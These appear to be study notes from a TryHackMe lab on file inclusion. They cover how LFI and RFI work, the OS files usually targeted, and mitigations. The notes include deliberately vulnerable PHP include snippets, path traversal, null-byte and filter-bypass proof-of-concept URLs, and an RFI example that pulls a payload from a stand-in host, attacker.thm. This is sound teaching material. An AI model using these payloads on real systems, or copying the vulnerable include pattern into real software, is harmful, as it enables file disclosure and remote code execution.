# File Inclusion

## 🔍 Overview
- File Inclusion vulnerabilities allow attackers to include files, usually through the web browser.
- Two main types:
  - Local File Inclusion (LFI): Include files already on the server.
  - Remote File Inclusion (RFI): Include files from remote locations.
- Can also exploit Directory Traversal to access sensitive files outside the web root.

## 🧩 Why File Inclusion Happens
- Caused by unsanitized user input in file handling functions (e.g., include, require, file_get_contents).
- Often found in PHP and similar languages when input is not validated.

## ⚠️ Risks
- Read sensitive files like /etc/passwd.
- Leak credentials or system information.
- Gain Remote Code Execution (RCE) when combined with write access or RFI.
- Expose SSH keys, mail, logs, etc.

## 🔐 Common Targeted OS Files
| File                          | Description                                    |
|------------------------------|------------------------------------------------|
| /etc/passwd                  | User account info                              |
| /etc/shadow                  | Password hashes                                |
| /var/log/apache2/access.log  | Web server logs                                |
| /proc/version                | Kernel version info                            |
| C:\boot.ini                 | Boot config on Windows                         |

![image](https://github.com/user-attachments/assets/264fcf24-a71b-4be3-a9f2-711e6ccbd925)

## 🧪 Types of File Inclusion Exploits

### Local File Inclusion (LFI)
1. Basic LFI (No Directory Constraints)
<?php 
    include($_GET["lang"]);
?>
PoC:
http://webapp.thm/index.php?lang=/etc/passwd

2. LFI with Directory Restriction
<?php 
    include("languages/" . $_GET['lang']); 
?>
PoC:
http://webapp.thm/index.php?lang=../../../../etc/passwd

3. Black Box Testing with Error Disclosure
Error Hint:
include(languages/THM.php);
PoC (Path Traversal):
http://webapp.thm/index.php?lang=../../../../etc/passwd
PoC with Null Byte (for older PHP < 5.3.4):
http://webapp.thm/index.php?lang=../../../../etc/passwd%00

4. Bypassing Filters (Keyword Filtering)
Tricks:
- Use /etc/passwd/. (current directory trick)
- Use /etc/passwd%00 (null byte)
- Replace ../ with ....// as PHP filter only matches and replaces the first subset string ../ it finds and doesn't do another pass
- Eg: http://webapp.thm/index.php?lang=....//....//etc/passwd

5. Forced Directory Prefix
PoC:
http://webapp.thm/index.php?lang=languages/../../../../etc/passwd

### Remote File Inclusion (RFI)
- Remote File Inclusion (RFI) is a technique to include remote files into a vulnerable application. Like LFI, the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into include function. One requirement for RFI is that the allow_url_fopen option needs to be on.
- The risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain Remote Command Execution (RCE) on the server. Other consequences of a successful RFI attack include:

- Sensitive Information Disclosure
- Cross-site Scripting (XSS)
- Denial of Service (DoS)

#### How it works
The attacker hosts a PHP file on their own server http://attacker.thm/cmd.txt where cmd.txt contains a printing message Hello THM, <?PHP echo "Hello THM"; ?>

- First, the attacker injects the malicious URL, which points to the attacker's server, such as http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt. 
- If there is no input validation, then the malicious URL passes into the include function. 
- Next, the web app server will send a GET request to the malicious server to fetch the file. 
- As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker. In our case, the current page somewhere has to show the Hello THM message.

## 🛡️ Mitigations
- Sanitize and validate all user input.
- Disable allow_url_fopen, allow_url_include.
- Use whitelisting for allowed files/paths.
- Keep PHP and frameworks up to date.
- Turn off verbose error messages in production.
- Deploy a Web Application Firewall (WAF).
